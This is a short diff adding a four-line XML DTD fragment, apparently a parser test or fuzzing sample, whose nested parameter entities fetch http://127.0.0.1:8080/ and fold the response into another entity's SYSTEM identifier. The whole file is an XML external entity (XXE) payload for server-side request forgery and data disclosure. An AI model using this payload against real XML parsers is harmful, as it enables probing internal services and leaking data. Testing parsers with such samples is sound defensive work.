@@ -1,0 +1,4 @@
+<!ENTITY % cfga SYSTEM "http://127.0.0.1:8080/">
+<!ENTITY % eea "<!ENTITY &#x25; lobsterdata SYSTEM '#%cfga;'>">
+%eea;
+%lobsterdata;
